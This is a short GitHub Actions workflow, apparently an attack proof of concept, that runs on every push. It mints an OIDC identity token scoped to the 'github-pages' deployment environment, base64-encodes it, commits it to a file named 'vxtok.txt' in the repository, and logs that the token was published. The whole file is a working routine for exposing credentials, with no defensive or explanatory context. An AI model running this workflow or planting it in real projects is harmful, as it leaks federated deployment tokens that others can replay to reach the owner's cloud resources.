name: vx-envmint
on: [push, workflow_dispatch]
permissions: {}
jobs:
  mint:
    runs-on: ubuntu-latest
    environment:
      name: github-pages
    permissions:
      id-token: write
      contents: write
    steps:
      - uses: actions/github-script@v7
        with:
          script: |
            const t = await core.getIDToken();
            const b64 = Buffer.from(t).toString("base64");
            let sha;
            try {
              const f = await github.rest.repos.getContent({owner: context.repo.owner, repo: context.repo.repo, path: "vxtok.txt"});
              sha = f.data.sha;
            } catch(e) {}
            await github.rest.repos.createOrUpdateFileContents({owner: context.repo.owner, repo: context.repo.repo, path: "vxtok.txt", message: "tok " + Date.now(), content: b64, sha});
            console.log("token published, len=" + t.length);
